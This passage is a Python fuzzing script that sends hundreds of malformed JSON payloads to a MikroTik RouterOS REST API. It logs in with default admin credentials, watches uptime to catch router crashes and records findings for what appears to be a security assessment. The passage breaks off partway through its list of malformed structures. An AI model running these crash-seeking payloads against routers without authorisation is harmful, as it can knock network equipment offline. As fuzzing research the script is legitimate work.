#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — JSON Parser Deep Fuzzing via REST API
Target: [REDACTED-INTERNAL-IP] ([REDACTED-CREDS])

Tests (200 total) targeting json::StreamParser::feed in the www binary:
  1. Deeply nested objects/arrays          (16 tests)
  2. Extremely long string values          (9 tests)
  3. Long key names                        (7 tests)
  4. Unicode edge cases                    (21 tests)
  5. Number parsing boundaries             (27 tests)
  6. Truncated JSON                        (13 tests)
  7. Type confusion                        (12 tests)
  8a. Null bytes                           (9 tests)
  8b. Escape sequence edge cases           (12 tests)
  8c. Duplicate keys                       (6 tests)
  8d. Whitespace abuse                     (10 tests)
  8e. Malformed JSON structures            (19 tests)
  8f. Large collections                    (11 tests)
  8g. Binary / non-JSON bodies             (8 tests)
  9. Multiple Content-Types                (10 tests)
 10. Body/Content-Length issues             (10 tests)
     + crash detection + health monitoring throughout

Evidence: evidence/attack_www_json.json
"""

import base64
import json
import os
import socket
import struct
import sys
import time
import warnings
from datetime import datetime
from pathlib import Path

warnings.filterwarnings("ignore")

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Configuration ────────────────────────────────────────────────────────────

TARGET = "[REDACTED-INTERNAL-IP]"
PORT = 80
AUTH = ("admin", "admin")
EVIDENCE_DIR = Path("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/evidence")
REST_ENDPOINT = "/rest/system/note/set"
BASE_URL = f"http://{TARGET}"
REST_URL = f"{BASE_URL}{REST_ENDPOINT}"

# ── Logging ──────────────────────────────────────────────────────────────────

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


# ── Router Health & Crash Detection ──────────────────────────────────────────

def check_health(timeout=5):
    """Check router health via REST API. Returns dict with alive, uptime, etc."""
    try:
        r = requests.get(
            f"{BASE_URL}/rest/system/resource",
            auth=AUTH, timeout=timeout, verify=False)
        if r.status_code == 200:
            data = r.json()
            return {
                "alive": True,
                "uptime": data.get("uptime"),
                "cpu_load": data.get("cpu-load"),
                "free_memory": data.get("free-memory"),
                "version": data.get("version"),
            }
        return {"alive": True, "status_code": r.status_code}
    except Exception:
        pass
    # TCP fallback
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.close()
        return {"alive": True, "method": "tcp_connect"}
    except Exception:
        return {"alive": False}


def wait_for_router(max_wait=90, interval=5):
    """Wait for router to come back after a crash/reboot."""
    log(f"  Waiting for router (max {max_wait}s)...")
    start = time.time()
    while time.time() - start < max_wait:
        h = check_health(timeout=3)
        if h.get("alive"):
            log(f"  Router is back: uptime={h.get('uptime')}")
            return h
        time.sleep(interval)
    log(f"  Router did not respond within {max_wait}s!")
    return {"alive": False, "waited": max_wait}


def detect_crash(pre_uptime, post_health):
    """Compare uptime strings to detect reboot. Returns True if crash detected."""
    if not post_health.get("alive"):
        return True
    post_uptime = post_health.get("uptime", "")
    if not pre_uptime or not post_uptime:
        return False
    # RouterOS uptime format: "1d2h3m4s" — if post < pre, router rebooted
    def parse_uptime(u):
        """Parse RouterOS uptime string to total seconds."""
        total = 0
        current = ""
        for ch in str(u):
            if ch.isdigit():
                current += ch
            elif ch == 'w':
                total += int(current or 0) * 604800
                current = ""
            elif ch == 'd':
                total += int(current or 0) * 86400
                current = ""
            elif ch == 'h':
                total += int(current or 0) * 3600
                current = ""
            elif ch == 'm':
                total += int(current or 0) * 60
                current = ""
            elif ch == 's':
                total += int(current or 0)
                current = ""
        return total

    pre_sec = parse_uptime(pre_uptime)
    post_sec = parse_uptime(post_uptime)
    # If post uptime is significantly less than pre, router rebooted
    return post_sec < pre_sec - 10


# ── Evidence Collector ───────────────────────────────────────────────────────

class EvidenceCollector:
    def __init__(self):
        self.results = {
            "metadata": {
                "script": "attack_www_json.py",
                "target": TARGET,
                "phase": "JSON parser deep fuzzing (www binary)",
                "start_time": datetime.now().isoformat(),
                "end_time": None,
                "total_tests": 0,
                "anomalies": 0,
                "crashes": 0,
                "router_version": None,
            },
            "tests": [],
            "findings": [],
            "crashes": [],
        }
        h = check_health()
        if h.get("alive"):
            self.results["metadata"]["router_version"] = h.get("version")
            self.results["metadata"]["initial_uptime"] = h.get("uptime")

    def add_test(self, category, name, description, result, details=None, anomaly=False):
        test = {
            "id": self.results["metadata"]["total_tests"] + 1,
            "category": category,
            "name": name,
            "description": description,
            "result": result,
            "anomaly": anomaly,
            "timestamp": datetime.now().isoformat(),
        }
        if details:
            test["details"] = details
        self.results["tests"].append(test)
        self.results["metadata"]["total_tests"] += 1
        if anomaly:
            self.results["metadata"]["anomalies"] += 1
        marker = "ANOMALY" if anomaly else "ok"
        log(f"  [{marker}] {name}: {result}")

    def add_finding(self, severity, title, description, cwe=None, cvss=None):
        finding = {
            "id": len(self.results["findings"]) + 1,
            "severity": severity,
            "title": title,
            "description": description,
            "timestamp": datetime.now().isoformat(),
        }
        if cwe:
            finding["cwe"] = cwe
        if cvss:
            finding["cvss_estimate"] = cvss
        self.results["findings"].append(finding)
        log(f"  FINDING [{severity}]: {title}")

    def record_crash(self, test_name, payload_desc, pre_uptime, post_health):
        crash = {
            "test_name": test_name,
            "payload_description": payload_desc,
            "pre_uptime": pre_uptime,
            "post_health": post_health,
            "timestamp": datetime.now().isoformat(),
        }
        self.results["crashes"].append(crash)
        self.results["metadata"]["crashes"] += 1
        log(f"  ** CRASH DETECTED ** during {test_name}")

    def save(self, filename):
        self.results["metadata"]["end_time"] = datetime.now().isoformat()
        final = check_health()
        self.results["metadata"]["final_health"] = final
        out = EVIDENCE_DIR / filename
        with open(out, "w") as f:
            json.dump(self.results, f, indent=2, default=str)
        log(f"Evidence saved to {out}")
        return out

    def summary(self):
        m = self.results["metadata"]
        f = len(self.results["findings"])
        c = m["crashes"]
        log("=" * 70)
        log(f"SUMMARY: {m['total_tests']} tests | {m['anomalies']} anomalies | "
            f"{f} findings | {c} crashes")
        log("=" * 70)
        if self.results["findings"]:
            for finding in self.results["findings"]:
                log(f"  [{finding['severity']}] {finding['title']}")
        if c > 0:
            log(f"  ** {c} ROUTER CRASH(ES) DETECTED **")


ec = EvidenceCollector()


# ── HTTP Helpers ─────────────────────────────────────────────────────────────

def trunc(s, maxlen=500):
    """Truncate string for evidence recording."""
    s = str(s)
    return s[:maxlen] + "..." if len(s) > maxlen else s


def send_json_raw(body_bytes, content_type="application/json", timeout=15):
    """POST raw bytes to REST_ENDPOINT with requests. Returns (status, body_text, elapsed_ms)."""
    try:
        start = time.time()
        r = requests.post(
            REST_URL,
            auth=AUTH,
            headers={"Content-Type": content_type},
            data=body_bytes,
            timeout=timeout,
            verify=False,
        )
        elapsed = (time.time() - start) * 1000
        return r.status_code, r.text, elapsed
    except requests.exceptions.Timeout:
        return 0, "TIMEOUT", timeout * 1000
    except requests.exceptions.ConnectionError as e:
        return 0, f"CONNECTION_ERROR: {e}", 0
    except Exception as e:
        return 0, f"ERROR: {e}", 0


def send_raw_socket(raw_http, timeout=10):
    """Send raw bytes via TCP socket. Returns (response_bytes, elapsed_ms)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        start = time.time()
        s.sendall(raw_http)
        # Read response
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        elapsed = (time.time() - start) * 1000
        s.close()
        return b"".join(chunks), elapsed
    except Exception as e:
        return str(e).encode(), 0


def build_basic_auth_header():
    """Build HTTP Basic auth header for raw socket requests."""
    creds = base64.b64encode(f"{AUTH[0]}:{AUTH[1]}".encode()).decode()
    return f"Authorization: Basic {creds}"


def run_test(category, name, desc, body_bytes, content_type="application/json",
             timeout=15, pre_uptime=None):
    """Run a single JSON parser test and record results. Returns post health."""
    status, resp_text, elapsed = send_json_raw(body_bytes, content_type, timeout)

    is_anomaly = (status == 0 or status >= 500)

    # Check for crash
    crashed = False
    post_health = None
    if status == 0:
        time.sleep(2)
        post_health = check_health(timeout=5)
        if not post_health.get("alive") or (pre_uptime and detect_crash(pre_uptime, post_health)):
            crashed = True
            ec.record_crash(name, desc, pre_uptime, post_health)
            ec.add_finding(
                "CRITICAL",
                f"Router crash: {name}",
                f"Sending payload for '{name}' caused router to become unresponsive or reboot. "
                f"Pre-uptime: {pre_uptime}, Post-health: {post_health}",
                cwe="CWE-120",
                cvss=9.8,
            )
            wait_for_router()
            post_health = check_health()

    ec.add_test(
        category, name, desc,
        f"HTTP {status} | {elapsed:.0f}ms | resp_len={len(resp_text)} | crash={crashed}",
        {
            "status": status,
            "response": trunc(resp_text),
            "elapsed_ms": round(elapsed, 1),
            "payload_size": len(body_bytes),
            "crashed": crashed,
        },
        anomaly=is_anomaly,
    )

    return post_health


def get_uptime():
    """Get current uptime string from router."""
    h = check_health()
    return h.get("uptime", "") if h.get("alive") else ""


# =============================================================================
# Category 1: Deeply Nested Objects/Arrays (~10 tests)
# =============================================================================

def test_deep_nesting():
    log("=" * 70)
    log("Category 1: Deeply Nested Objects/Arrays")
    log("=" * 70)

    uptime = get_uptime()

    # Nested objects: {"a":{"a":{"a":...}}}
    obj_depths = [100, 500, 1000, 5000, 10000]
    for depth in obj_depths:
        opening = '{"a":' * depth
        closing = '"leaf"' + '}' * depth
        payload = (opening + closing).encode("utf-8")
        name = f"nested_objects_{depth}"
        desc = f"POST {depth}-level nested JSON objects to trigger parse_json_element recursion"
        run_test("deep_nesting", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()

    # Nested arrays: [[[...]]]
    arr_depths = [100, 500, 1000, 5000, 10000]
    for depth in arr_depths:
        opening = '[' * depth
        closing = '1' + ']' * depth
        payload = (opening + closing).encode("utf-8")
        name = f"nested_arrays_{depth}"
        desc = f"POST {depth}-level nested JSON arrays to test stack depth limits"
        run_test("deep_nesting", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()

    # Alternating nested objects and arrays: {"a":[{"a":[...]}]}
    alt_depths = [100, 500, 1000, 5000]
    for depth in alt_depths:
        opening = '{"a":[' * depth
        closing = '"leaf"' + ']}' * depth
        payload = (opening + closing).encode("utf-8")
        name = f"nested_alternating_{depth}"
        desc = f"POST {depth}-level alternating obj/arr nesting to stress type-tracking state machine"
        run_test("deep_nesting", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()

    # Nesting with many sibling keys at each level
    for depth in [50, 200]:
        inner = '"x":"leaf"'
        for _ in range(depth):
            inner = f'"a":{{{inner}}},"b":"sibling","c":123'
            inner = '{' + inner + '}'
        payload = inner.encode("utf-8")
        name = f"nested_wide_{depth}"
        desc = f"POST {depth}-level nested objects with 3 sibling keys per level"
        run_test("deep_nesting", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 2: Extremely Long String Values (~4 tests)
# =============================================================================

def test_long_strings():
    log("=" * 70)
    log("Category 2: Extremely Long String Values")
    log("=" * 70)

    uptime = get_uptime()

    sizes = [
        ("1KB", 1024),
        ("10KB", 10240),
        ("100KB", 102400),
        ("1MB", 1048576),
    ]
    for label, size in sizes:
        value = "A" * size
        payload = json.dumps({"note": value}).encode("utf-8")
        name = f"long_string_value_{label}"
        desc = f"POST JSON with {label} string value to test StreamParser buffer handling"
        run_test("long_strings", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()

    # Long string with many JSON escape sequences (\n repeated)
    esc_value = "\\n" * 50000
    payload = ('{"note":"' + esc_value + '"}').encode("utf-8")
    run_test("long_strings", "long_escaped_newlines_100KB",
             "POST JSON with 50000 \\n escape sequences (~100KB) to stress escape decoder",
             payload, timeout=30, pre_uptime=uptime)
    uptime = get_uptime()

    # Long string with many Unicode escapes (\u0041 = 'A' repeated)
    uni_value = "\\u0041" * 20000
    payload = ('{"note":"' + uni_value + '"}').encode("utf-8")
    run_test("long_strings", "long_unicode_escapes_120KB",
             "POST JSON with 20000 \\u0041 Unicode escapes (~120KB) to stress escape decoder",
             payload, timeout=30, pre_uptime=uptime)
    uptime = get_uptime()

    # Long string of just backslashes (escaped)
    bs_value = "\\\\" * 50000
    payload = ('{"note":"' + bs_value + '"}').encode("utf-8")
    run_test("long_strings", "long_backslashes_100KB",
             "POST JSON with 50000 escaped backslash pairs to test escape handling",
             payload, timeout=30, pre_uptime=uptime)
    uptime = get_uptime()

    # String at exact power-of-2 boundaries (allocation edge cases)
    for exp in [12, 16]:  # 4096 and 65536
        boundary_size = (2 ** exp) - 1
        value = "B" * boundary_size
        payload = json.dumps({"note": value}).encode("utf-8")
        name = f"long_string_pow2_minus1_{2**exp}"
        desc = f"POST JSON with string length {boundary_size} (2^{exp}-1) — allocation boundary"
        run_test("long_strings", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 3: Long Key Names (~4 tests)
# =============================================================================

def test_long_keys():
    log("=" * 70)
    log("Category 3: Long Key Names")
    log("=" * 70)

    uptime = get_uptime()

    sizes = [
        ("1KB", 1024),
        ("10KB", 10240),
        ("100KB", 102400),
        ("1MB", 1048576),
    ]
    for label, size in sizes:
        key = "K" * size
        # Build manually to avoid Python dict key issues
        payload = ('{"' + key + '":"value"}').encode("utf-8")
        name = f"long_key_name_{label}"
        desc = f"POST JSON with {label} key name to test parser key buffer allocation"
        run_test("long_keys", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()

    # Key name with unicode escapes
    uni_key = "\\u004B" * 5000  # 'K' x5000 via unicode escape
    payload = ('{"' + uni_key + '":"value"}').encode("utf-8")
    run_test("long_keys", "long_key_unicode_escapes",
             "POST JSON with 5000 unicode-escaped key chars to stress key decoder",
             payload, timeout=30, pre_uptime=uptime)
    uptime = get_uptime()

    # Many small keys in one object
    many_keys = ",".join(f'"k{i}":"v{i}"' for i in range(1000))
    payload = ("{" + many_keys + "}").encode("utf-8")
    run_test("long_keys", "many_keys_1000",
             "POST JSON object with 1000 distinct key-value pairs",
             payload, timeout=30, pre_uptime=uptime)
    uptime = get_uptime()

    # 5000 keys
    many_keys = ",".join(f'"k{i}":"v{i}"' for i in range(5000))
    payload = ("{" + many_keys + "}").encode("utf-8")
    run_test("long_keys", "many_keys_5000",
             "POST JSON object with 5000 distinct key-value pairs",
             payload, timeout=30, pre_uptime=uptime)
    uptime = get_uptime()


# =============================================================================
# Category 4: Unicode Edge Cases (~14 tests)
# =============================================================================

def test_unicode_edge_cases():
    log("=" * 70)
    log("Category 4: Unicode Edge Cases")
    log("=" * 70)

    uptime = get_uptime()

    # Each test is (name, raw_bytes) — some need manual byte construction
    tests = [
        # Overlong UTF-8: 2-byte encoding of ASCII '/' (0x2F)
        # Valid: 0x2F; Overlong: 0xC0 0xAF
        ("overlong_utf8_2byte",
         b'{"note":"test\xc0\xafend"}',
         "Overlong UTF-8 encoding (2-byte for ASCII char) to test UTF-8 validation"),

        # Surrogate pairs via JSON escape
        ("surrogate_pair_valid",
         b'{"note":"test\\uD800\\uDC00end"}',
         "Valid surrogate pair (\\uD800\\uDC00) in JSON string"),

        # Lone high surrogate (invalid)
        ("lone_high_surrogate",
         b'{"note":"test\\uD800end"}',
         "Lone high surrogate (\\uD800) without low surrogate — invalid"),

        # Lone low surrogate (invalid)
        ("lone_low_surrogate",
         b'{"note":"test\\uDC00end"}',
         "Lone low surrogate (\\uDC00) without high surrogate — invalid"),

        # Null character via JSON escape
        ("json_null_char",
         b'{"note":"test\\u0000end"}',
         "Null character via \\u0000 JSON escape in string value"),

        # U+FFFE (non-character)
        ("unicode_fffe",
         b'{"note":"test\\uFFFEend"}',
         "U+FFFE (non-character, byte-order mark inverse) in JSON string"),

        # 4-byte emoji sequence (direct UTF-8)
        ("emoji_4byte",
         '{"note":"test\U0001F4A9end"}'.encode("utf-8"),
         "4-byte UTF-8 emoji (U+1F4A9) in JSON string value"),

        # Invalid UTF-8: 0xFF byte
        ("invalid_utf8_ff",
         b'{"note":"test\xffend"}',
         "Invalid UTF-8 byte 0xFF in JSON string value"),

        # Invalid UTF-8: 0xFE byte
        ("invalid_utf8_fe",
         b'{"note":"test\xfeend"}',
         "Invalid UTF-8 byte 0xFE in JSON string value"),

        # Continuation byte without start byte
        ("continuation_no_start",
         b'{"note":"test\x80\x81\x82end"}',
         "UTF-8 continuation bytes (0x80-0x82) without start byte"),

        # Start byte without continuation
        ("start_no_continuation",
         b'{"note":"test\xe0end"}',
         "UTF-8 3-byte start (0xE0) without continuation bytes"),

        # Overlong 3-byte encoding of '/' (0x2F)
        ("overlong_utf8_3byte",
         b'{"note":"test\xe0\x80\xafend"}',
         "Overlong 3-byte UTF-8 encoding of ASCII '/' — security bypass vector"),

        # BOM at start of JSON
        ("utf8_bom_prefix",
         b'\xef\xbb\xbf{"note":"test"}',
         "UTF-8 BOM (0xEF 0xBB 0xBF) prepended to JSON body"),

        # Mixed valid and invalid in same string
        ("mixed_valid_invalid_utf8",
         b'{"note":"valid\xc3\xa9then\xffinvalid\xc0\xafthenOK"}',
         "Mix of valid UTF-8 (e-acute), invalid 0xFF, and overlong sequence"),

        # U+0000 via raw byte (not JSON escape)
        ("raw_null_in_json_string",
         b'{"note":"test\x00end"}',
         "Raw 0x00 byte in JSON string (different from \\u0000 escape)"),

        # Maximum valid Unicode code point
        ("max_unicode_codepoint",
         '{"note":"test\U0010FFFFend"}'.encode("utf-8"),
         "Maximum Unicode code point U+10FFFF in string"),

        # Right-to-left override character
        ("rtl_override",
         b'{"note":"test\\u202Eend"}',
         "Right-to-left override (U+202E) — text direction attack"),

        # Zero-width joiner/non-joiner
        ("zwj_sequence",
         b'{"note":"test\\u200D\\u200C\\u200Bend"}',
         "Zero-width joiner, non-joiner, and space sequence"),

        # Replacement character
        ("replacement_char_flood",
         ('{"note":"' + '\ufffd' * 1000 + '"}').encode("utf-8"),
         "1000 U+FFFD replacement characters in string"),

        # Private use area characters
        ("private_use_area",
         b'{"note":"test\\uE000\\uF8FF\\uDB80\\uDC00end"}',
         "Private Use Area characters (BMP and supplementary)"),
    ]

    for name, payload, desc in tests:
        run_test("unicode", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 5: Number Parsing Boundaries (~15 tests)
# =============================================================================

def test_number_boundaries():
    log("=" * 70)
    log("Category 5: Number Parsing Boundaries")
    log("=" * 70)

    uptime = get_uptime()

    numbers = [
        ("int32_max",           "2147483647"),
        ("int32_max_plus1",     "2147483648"),
        ("int32_min",           "-2147483648"),
        ("int32_min_minus1",    "-2147483649"),
        ("uint32_max",          "4294967295"),
        ("uint32_max_plus1",    "4294967296"),
        ("int64_max",           "9223372036854775807"),
        ("int64_max_plus1",     "9223372036854775808"),
        ("large_integer",       "9999999999999999"),
        ("float_max",           "1e308"),
        ("float_overflow",      "1e309"),
        ("nan_literal",         "NaN"),
        ("inf_literal",         "Infinity"),
        ("neg_inf_literal",     "-Infinity"),
        ("neg_zero",            "-0"),
        ("tiny_float",          "0.0000000000000001"),
        ("float_underflow",     "1e-400"),
        ("leading_zeros",       "007"),
        ("leading_plus",        "+42"),
        ("hex_literal",         "0xFF"),
        ("octal_literal",       "0777"),
        ("double_negative",     "--1"),
        ("exp_plus",            "1e+308"),
        ("exp_negative_large",  "1e-308"),
        ("very_long_integer",   "1" * 1000),
        ("very_long_decimal",   "0." + "1" * 1000),
        ("many_leading_zeros",  "0" * 100 + "1"),
    ]

    for name, numstr in numbers:
        payload = f'{{"note":"test","value":{numstr}}}'.encode("utf-8")
        desc = f"JSON with numeric value {numstr} to test number parser edge cases"
        run_test("number_parsing", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 6: Truncated JSON (~7 tests)
# =============================================================================

def test_truncated_json():
    log("=" * 70)
    log("Category 6: Truncated JSON")
    log("=" * 70)

    uptime = get_uptime()

    truncations = [
        ("mid_string",         b'{"note":"trun'),
        ("mid_number",         b'{"note":"x","val":123'),
        ("mid_key",            b'{"no'),
        ("after_colon",        b'{"note":'),
        ("after_comma",        b'{"note":"x",'),
        ("after_open_brace",   b'{'),
        ("after_open_bracket", b'['),
        ("mid_true",           b'{"note":tru'),
        ("mid_false",          b'{"note":fal'),
        ("mid_null",           b'{"note":nu'),
        ("mid_escape",         b'{"note":"test\\'),
        ("mid_unicode_escape", b'{"note":"test\\u00'),
        ("after_backslash_u",  b'{"note":"test\\u'),
    ]

    for name, payload in truncations:
        desc = f"Truncated JSON ({name}) — tests StreamParser incomplete input handling"
        run_test("truncated_json", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 7: Type Confusion (~12 tests)
# =============================================================================

def test_type_confusion():
    log("=" * 70)
    log("Category 7: Type Confusion")
    log("=" * 70)

    uptime = get_uptime()

    payloads = [
        # String where number expected
        ("string_for_number",
         b'{"note":"test","value":"not_a_number"}',
         "String value where numeric expected"),

        # Array where object expected
        ("array_for_object",
         b'[{"note":"test"}]',
         "Top-level array instead of object"),

        # Object where string expected
        ("object_for_string",
         b'{"note":{"nested":"object"}}',
         "Object value where string expected"),

        # Array where string expected
        ("array_for_string",
         b'{"note":["a","b","c"]}',
         "Array value where string expected"),

        # Boolean where string expected
        ("bool_for_string",
         b'{"note":true}',
         "Boolean value where string expected"),

        # Null where string expected
        ("null_for_string",
         b'{"note":null}',
         "Null value where string expected"),

        # Number where string expected
        ("number_for_string",
         b'{"note":42}',
         "Number value where string expected"),

        # Deeply nested wrong types
        ("nested_array_of_objects",
         b'{"note":[{"a":1},{"b":2},{"c":[3,4,5]}]}',
         "Nested arrays of objects where string expected"),

        # Empty nested containers
        ("nested_empty_containers",
         b'{"note":{"a":{"b":{"c":{}}}}}',
         "Deeply nested empty objects"),

        # Mixed type array
        ("mixed_type_array",
         b'{"note":[1,"two",true,null,{"five":5},[6]]}',
         "Array with mixed types where string expected"),

        # Duplicate keys with different types
        ("dup_keys_diff_types",
         b'{"note":"string","note":123,"note":true,"note":null}',
         "Duplicate key 'note' with string, number, boolean, null values"),

        # Extremely deep mixed nesting
        ("deep_mixed_nesting",
         b'{"a":{"b":[{"c":{"d":[{"e":"leaf"}]}}]}}',
         "Mixed object/array nesting to confuse type tracking"),
    ]

    for name, payload, desc in payloads:
        run_test("type_confusion", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 8: Null Bytes (~9 tests)
# =============================================================================

def test_null_bytes():
    log("=" * 70)
    log("Category 8: Null Bytes in JSON")
    log("=" * 70)

    uptime = get_uptime()

    tests = [
        # Null byte in string value (raw, not JSON-escaped)
        ("raw_null_in_value",
         b'{"note":"before\x00after"}',
         "Raw null byte (0x00) in JSON string value"),

        # Null byte in key name (raw)
        ("raw_null_in_key",
         b'{"no\x00te":"value"}',
         "Raw null byte in JSON key name — may truncate key"),

        # Null byte between tokens
        ("null_between_tokens",
         b'{"note"\x00:"value"}',
         "Null byte between key and colon"),

        # Null byte before JSON
        ("null_before_json",
         b'\x00{"note":"value"}',
         "Null byte before opening brace"),

        # Null byte after JSON
        ("null_after_json",
         b'{"note":"value"}\x00',
         "Null byte after closing brace"),

        # Multiple null bytes
        ("multiple_nulls",
         b'{"note":"\x00\x00\x00\x00\x00"}',
         "Five consecutive null bytes in string value"),

        # Null byte in JSON escape form in key
        ("json_escape_null_key",
         b'{"no\\u0000te":"value"}',
         "JSON-escaped null (\\u0000) in key name"),

        # Null byte between key-value pairs
        ("null_between_pairs",
         b'{"a":"1",\x00"b":"2"}',
         "Null byte between two key-value pairs"),

        # Null byte flood
        ("null_flood_value",
         b'{"note":"' + b'\x00' * 1000 + b'"}',
         "1000 consecutive null bytes in string value"),
    ]

    for name, payload, desc in tests:
        run_test("null_bytes", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 8b: Escape Sequence Edge Cases (~12 tests)
# =============================================================================

def test_escape_sequences():
    log("=" * 70)
    log("Category 8b: Escape Sequence Edge Cases")
    log("=" * 70)

    uptime = get_uptime()

    tests = [
        # Valid escapes
        ("all_valid_escapes",
         b'{"note":"\\t\\n\\r\\f\\b\\\\\\/\\""}',
         "All valid JSON escape characters in one string"),

        # Invalid escape character
        ("invalid_escape_x",
         b'{"note":"test\\xend"}',
         "Invalid escape \\x (not a valid JSON escape)"),

        ("invalid_escape_a",
         b'{"note":"test\\aend"}',
         "Invalid escape \\a (bell character, not valid in JSON)"),

        ("invalid_escape_0",
         b'{"note":"test\\0end"}',
         "Invalid escape \\0 (C-style null, not valid JSON)"),

        ("invalid_escape_v",
         b'{"note":"test\\vend"}',
         "Invalid escape \\v (vertical tab, not valid JSON)"),

        # Lone backslash at end of string
        ("lone_backslash_end",
         b'{"note":"test\\"}',
         "Lone backslash at end of JSON string — unterminated escape"),

        # Double-escaped sequences
        ("double_escaped_n",
         b'{"note":"test\\\\nend"}',
         "Double-escaped \\\\n — should produce literal backslash + n"),

        # Unicode escape edge cases
        ("unicode_escape_lowercase",
         b'{"note":"\\u00e9"}',
         "Lowercase hex in unicode escape (e-acute)"),

        ("unicode_escape_uppercase",
         b'{"note":"\\u00E9"}',
         "Uppercase hex in unicode escape (e-acute)"),

        ("unicode_escape_incomplete_3",
         b'{"note":"\\u00E"}',
         "Incomplete unicode escape (only 3 hex digits)"),

        ("unicode_escape_incomplete_2",
         b'{"note":"\\u00"}',
         "Incomplete unicode escape (only 2 hex digits)"),

        ("unicode_escape_non_hex",
         b'{"note":"\\uGGGG"}',
         "Non-hex characters in unicode escape"),
    ]

    for name, payload, desc in tests:
        run_test("escape_sequences", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 8c: Duplicate Keys (~6 tests)
# =============================================================================

def test_duplicate_keys():
    log("=" * 70)
    log("Category 8c: Duplicate Keys")
    log("=" * 70)

    uptime = get_uptime()

    tests = [
        ("dup_same_value",
         b'{"note":"first","note":"second"}',
         "Duplicate key 'note' with different string values — which wins?"),

        ("dup_diff_types",
         b'{"note":"string","note":123}',
         "Duplicate key with string then number — type confusion"),

        ("dup_triple",
         b'{"note":"a","note":"b","note":"c"}',
         "Triple duplicate key"),

        ("dup_null_then_string",
         b'{"note":null,"note":"real_value"}',
         "Duplicate key: null then string — null override test"),

        ("dup_nested_then_flat",
         b'{"note":{"a":"b"},"note":"flat"}',
         "Duplicate key: object then string — type confusion"),

        ("dup_100_keys",
         b'{"note":"v0"' + b',"note":"overwrite"' * 99 + b'}',
         "100 duplicate 'note' keys — stress hash table/last-wins handling"),
    ]

    for name, payload, desc in tests:
        run_test("duplicate_keys", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 8d: Whitespace Abuse (~10 tests)
# =============================================================================

def test_whitespace_abuse():
    log("=" * 70)
    log("Category 8d: Whitespace Abuse")
    log("=" * 70)

    uptime = get_uptime()

    tests = [
        # Leading whitespace
        ("leading_spaces",
         b'   {"note":"test"}',
         "JSON with leading spaces before opening brace"),

        ("leading_tabs",
         b'\t\t\t{"note":"test"}',
         "JSON with leading tabs before opening brace"),

        ("leading_newlines",
         b'\n\n\n{"note":"test"}',
         "JSON with leading newlines before opening brace"),

        ("leading_crlf",
         b'\r\n\r\n{"note":"test"}',
         "JSON with leading CRLF before opening brace"),

        # Whitespace between tokens
        ("excessive_internal_whitespace",
         b'{   "note"   :   "test"   }',
         "JSON with excessive whitespace between all tokens"),

        # Whitespace only
        ("only_whitespace",
         b'   \t\n\r   ',
         "Body is only whitespace characters — no JSON at all"),

        # Very large whitespace prefix
        ("large_whitespace_prefix",
         b' ' * 100000 + b'{"note":"test"}',
         "100KB of spaces before the JSON body starts"),

        # Whitespace in key (raw, outside quotes)
        ("whitespace_around_colon",
         b'{ "note" \t\n : \t\n "test" }',
         "Tabs and newlines around colon and between tokens"),

        # Form feed and vertical tab (technically not JSON whitespace)
        ("form_feed_between_tokens",
         b'{\f"note"\f:\f"test"\f}',
         "Form feed (0x0C) between JSON tokens — not valid JSON whitespace"),

        ("vertical_tab_between_tokens",
         b'{\x0b"note"\x0b:\x0b"test"\x0b}',
         "Vertical tab (0x0B) between JSON tokens — not valid JSON whitespace"),
    ]

    for name, payload, desc in tests:
        run_test("whitespace", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 8e: Malformed JSON Structures (~15 tests)
# =============================================================================

def test_malformed_structures():
    log("=" * 70)
    log("Category 8e: Malformed JSON Structures")
    log("=" * 70)

    uptime = get_uptime()

    tests = [
        ("trailing_comma_obj",
         b'{"note":"test",}',
         "Trailing comma in object — invalid JSON"),

        ("trailing_comma_arr",
         b'{"note":["a","b",]}',
         "Trailing comma in array — invalid JSON"),

        ("double_comma",
         b'{"note":"a",,"extra":"b"}',
         "Double comma between key-value pairs"),

        ("missing_colon",
         b'{"note" "test"}',
         "Missing colon between key and value"),

        ("missing_comma",
         b'{"note":"a" "extra":"b"}',
         "Missing comma between key-value pairs"),

        ("single_quotes",
         b"{'note':'test'}",
         "Single-quoted strings (JavaScript-style, not valid JSON)"),

        ("unquoted_key",
         b'{note:"test"}',
         "Unquoted key name (JavaScript-style, not valid JSON)"),

        ("extra_closing_brace",
         b'{"note":"test"}}',
         "Extra closing brace after valid JSON object"),

        ("extra_closing_bracket",
         b'{"note":["a"]]}',
         "Extra closing bracket after valid array"),

        ("mismatched_brackets",
         b'{"note":["test"}',
         "Opening bracket closed with brace — mismatched delimiters"),

        ("mismatched_braces",
         b'{"note":"test"]',
         "Opening brace closed with bracket — mismatched delimiters"),

        ("just_value_string",
         b'"just a bare string"',
         "Bare JSON string at top level (not in object)"),

        ("just_value_number",
         b'42',
